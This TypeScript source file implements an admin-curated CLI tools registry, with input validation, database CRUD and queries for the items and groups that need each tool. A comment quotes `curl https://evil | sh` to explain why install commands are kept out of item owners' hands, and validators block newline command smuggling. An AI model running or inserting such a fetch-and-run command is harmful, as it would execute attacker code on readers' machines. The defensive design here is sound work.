import { z } from 'zod';
import { itemReadSql, requiringGroupsSql } from '../access.ts';
import { isUniqueViolation, now, type Db } from '../db.ts';
import { HttpError, notFound } from '../lib/http.ts';
import { CLI_NAME } from '../items/lint.ts';
import { servesRequiringCheck, type ResolvedMember } from '../groups/service.ts';
import type { GroupRow, Kind, Principal } from '../types.ts';

/**
 * The CLI tools registry (docs/PLAN-v3.md "CLI tools", f9j0 / fx78). Install commands come only from
 * these admin-curated rows, never from item frontmatter: a reader pastes and runs them, so an item
 * owner must not be able to put `curl https://evil | sh` under a friendly name. Items only name the
 * CLI (version_requires). SCP displays the commands and never runs them.
 */

export const PLATFORMS = ['macos', 'linux', 'windows', 'any'] as const;
export type CliInstall = Partial<Record<(typeof PLATFORMS)[number], string>>;

export interface CliTool {
  name: string;
  homepage: string;
  /** Binary looked up on PATH by the check one-liner; defaults to the name. */
  check: string;
  install: CliInstall;
  updatedAt: string;
}

/** fx78: what the viewer can read that needs the tool. */
export interface UsedBy {
  items: { id: string; kind: Kind; name: string; title: string }[];
  groups: { slug: string; name: string }[];
}

export interface RequiredCli {
  name: string;
  /** The effective members whose served version requires it. */
  items: { id: string; name: string }[];
  tool: Pick<CliTool, 'homepage' | 'check' | 'install'> | null;
  /** With tool null: the GitHub repos the requiring items were imported from, the only pointer SCP has. */
  sources?: string[];
}

/** Binary names go into the check one-liner verbatim, so no shell metacharacters. */
const BIN = /^[A-Za-z0-9][A-Za-z0-9._+-]{0,63}$/;
/** One command line each: a newline would smuggle a second command past a reader skimming the first. */
const command = z
  .string()
  .trim()
  .max(1000)
  .refine((s) => !/[\r\n\u0000]/.test(s), 'an install command is one line');

const fields = {
  homepage: z
    .string()
    .trim()
    .max(500)
    .refine((s) => s === '' || /^https?:\/\/[^\s/]+\S*$/.test(s), 'homepage must be an http(s) URL')
    .default(''),
  /** '' or omitted: the name. */
  check: z.string().trim().max(64).refine((s) => s === '' || BIN.test(s), 'check must be a binary name').optional(),
  install: z.strictObject({ macos: command.optional(), linux: command.optional(), windows: command.optional(), any: command.optional() }).default({}),
};
export const toolCreateSchema = z.object({ name: z.string().regex(CLI_NAME, 'name must match ^[a-z0-9][a-z0-9._-]{0,63}$'), ...fields });
export const toolUpdateSchema = z.object(fields);
type ToolInput = z.infer<typeof toolUpdateSchema>;

interface ToolRow {
  name: string;
  homepage: string;
  check_bin: string;
  install: string;
  created_at: string;
  updated_at: string;
}

const toTool = (r: ToolRow): CliTool => ({ name: r.name, homepage: r.homepage, check: r.check_bin, install: JSON.parse(r.install) as CliInstall, updatedAt: r.updated_at });

/** Empty commands are dropped, so "no command for this platform" has one spelling. */
const cleanInstall = (install: CliInstall): CliInstall =>
  Object.fromEntries(PLATFORMS.flatMap((k) => (install[k] ? [[k, install[k]]] : [])));

export const listToolRows = (db: Db): CliTool[] => (db.prepare('SELECT * FROM cli_tools ORDER BY name').all() as unknown as ToolRow[]).map(toTool);

export function getToolRow(db: Db, name: string): CliTool | null {
  const r = db.prepare('SELECT * FROM cli_tools WHERE name = ?').get(name) as ToolRow | undefined;
  return r ? toTool(r) : null;
}

export function createTool(db: Db, name: string, input: ToolInput): CliTool {
  const ts = now();
  try {
    db.prepare('INSERT INTO cli_tools (name, homepage, check_bin, install, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?)').run(
      name,
      input.homepage,
      input.check || name,
      JSON.stringify(cleanInstall(input.install)),
      ts,
      ts,
    );
  } catch (e) {
    if (isUniqueViolation(e)) throw new HttpError(409, 'tool_exists', `the registry already has '${name}'`);
    throw e;
  }
  return getToolRow(db, name)!;
}

export function updateTool(db: Db, name: string, input: ToolInput): CliTool {
  const r = db
    .prepare('UPDATE cli_tools SET homepage = ?, check_bin = ?, install = ?, updated_at = ? WHERE name = ?')
    .run(input.homepage, input.check || name, JSON.stringify(cleanInstall(input.install)), now(), name);
  if (!r.changes) throw notFound('tool');
  return getToolRow(db, name)!;
}

export function deleteTool(db: Db, name: string): void {
  if (!db.prepare('DELETE FROM cli_tools WHERE name = ?').run(name).changes) throw notFound('tool');
}

/** usedBy entries per kind: a CLI every public skill needs must not make the listing attacker-sized. */
export const USED_BY_MAX = 50;
/**
 * What one usedBy call may spend confirming its candidate groups (groups/service.ts
 * servesRequiringCheck, 5x0a): at most about 500 statements, tens of milliseconds, so a CLI whose
 * candidates all fail the check cannot make every reader's /tools seconds long.
 */
export const USED_BY_CHECK_BUDGET = 500;

/** Readable items whose latest version requires the CLI, and readable groups whose Requires panel lists it. */
export function usedBy(db: Db, p: Principal, name: string): UsedBy {
  const read = itemReadSql(p);
  const items = db
    .prepare(
      `SELECT i.id, i.kind, i.name, i.title FROM version_requires vr JOIN item_versions v ON v.id = vr.version_id JOIN items i ON i.id = v.item_id AND v.seq = i.latest_seq
       WHERE vr.name = ? AND ${read.sql} ORDER BY i.name, i.id LIMIT ${USED_BY_MAX}`,
    )
    .all(name, ...read.params) as UsedBy['items'];
  const g = requiringGroupsSql(p);
  const groups: UsedBy['groups'] = [];
  // ponytail: past USED_BY_CHECK_BUDGET the remaining candidates go unchecked, so a group whose
  // Requires panel lists the CLI may be missed (never one whose panel does not). Upgrade path: the
  // first-occurrence rule in SQL.
  const check = servesRequiringCheck(db, p, name, USED_BY_CHECK_BUDGET);
  for (const row of db.prepare(g.sql).iterate(name, ...g.params) as Iterable<GroupRow>) {
    if (groups.length >= USED_BY_MAX) break;
    const serves = check(row);
    if (serves === null) break;
    if (serves) groups.push({ slug: row.slug, name: row.name });
  }
  return { items: items.map((r) => ({ ...r })), groups };
}

/** One registry row as /tools shows it: the row plus what the viewer can read that needs it. */
export const toolView = (db: Db, p: Principal, t: CliTool) => ({ ...t, usedBy: usedBy(db, p, t.name) });

/** fx78 GET /tools and the MCP scp://tools resource: every registry row, sorted by name. */
export const listTools = (db: Db, p: Principal) => listToolRows(db).map((t) => toolView(db, p, t));

const GITHUB_REPO = /^[A-Za-z0-9_.-]+\/[A-Za-z0-9_.-]+$/;

/**
 * The CLIs a group's effective members require (its resolved versions, included groups too), sorted by
 * name, each with the registry row or null. Nothing here reads frontmatter: only version_requires names
 * and the registry, so an item's own `metadata.install` cannot reach a reader.
 */
export function requiresOf(db: Db, members: ResolvedMember[]): RequiredCli[] {
  if (!members.length) return [];
  const rows = db
    .prepare('SELECT version_id, name FROM version_requires WHERE version_id IN (SELECT value FROM json_each(?))')
    .all(JSON.stringify(members.map((m) => m.version.id))) as { version_id: string; name: string }[];
  const byVersion = new Map(members.map((m) => [m.version.id, m]));
  const out = new Map<string, { items: ResolvedMember[] }>();
  for (const r of rows) {
    const e = out.get(r.name) ?? { items: [] };
    e.items.push(byVersion.get(r.version_id)!);
    out.set(r.name, e);
  }
  return [...out.keys()].sort().map((name) => {
    const ms = out.get(name)!.items;
    const t = getToolRow(db, name);
    const entry: RequiredCli = { name, items: ms.map((m) => ({ id: m.item.id, name: m.item.name })), tool: t && { homepage: t.homepage, check: t.check, install: t.install } };
    if (!t) {
      const repos = ms.flatMap((m) => (m.item.source_kind === 'github' && m.item.source_repo && GITHUB_REPO.test(m.item.source_repo) ? [`https://github.com/${m.item.source_repo}`] : []));
      if (repos.length) entry.sources = [...new Set(repos)];
    }
    return entry;
  });
}
